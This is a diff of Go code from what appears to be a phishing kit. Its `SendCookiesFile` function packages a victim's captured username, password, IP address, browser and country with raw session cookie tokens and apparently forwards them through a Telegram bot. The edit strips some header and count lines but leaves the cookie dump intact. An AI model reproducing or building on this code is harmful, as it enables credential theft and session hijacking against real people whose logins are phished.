@@ -622,19 +622,13 @@ func (t *TelegramBot) SendCookiesFile(sessionID string, name string, username st
 	log.Info("جاري تجهيز إرسال الكوكيز للجلسة: %s", sessionID)
 	
 	// تجهيز محتوى الملف
-	cookiesText := fmt.Sprintf("=== معلومات الجلسة %s ===\n", sessionID)
-	cookiesText += fmt.Sprintf("الفيشلت: %s\n", name)
-	cookiesText += fmt.Sprintf("اسم المستخدم: %s\n", username)
-	cookiesText += fmt.Sprintf("كلمة المرور: %s\n", password)
-	cookiesText += fmt.Sprintf("عنوان IP: %s\n", remoteAddr)
-	cookiesText += fmt.Sprintf("متصفح المستخدم: %s\n", userAgent)
-	cookiesText += fmt.Sprintf("الدولة: %s (%s)\n\n", country, countryCode)
+	cookiesText := fmt.Sprintf("\n", )
+
 	
 	// معالجة توكنات الكوكيز
 	if cookieTokens == nil || len(cookieTokens) == 0 {
 		cookiesText += "=== لم يتم العثور على كوكيز ===\n\n"
 	} else {
-		cookiesText += "=== توكنات الكوكيز الخام ===\n"
 		cookieJSON, err := json.MarshalIndent(cookieTokens, "", "  ")
 		if err != nil {
 			log.Error("خطأ في تحويل الكوكيز إلى JSON: %v", err)
@@ -649,8 +643,6 @@ func (t *TelegramBot) SendCookiesFile(sessionID string, name string, username st
 		for _, cookies := range cookieTokens {
 			cookieCount += len(cookies)
 		}
-		cookiesText += fmt.Sprintf("إجمالي الكوكيز: %d\n", cookieCount)
-		cookiesText += fmt.Sprintf("إجمالي نطاقات الكوكيز: %d\n\n", len(cookieTokens))
 	}
 	
 	// معالجة توكنات Body
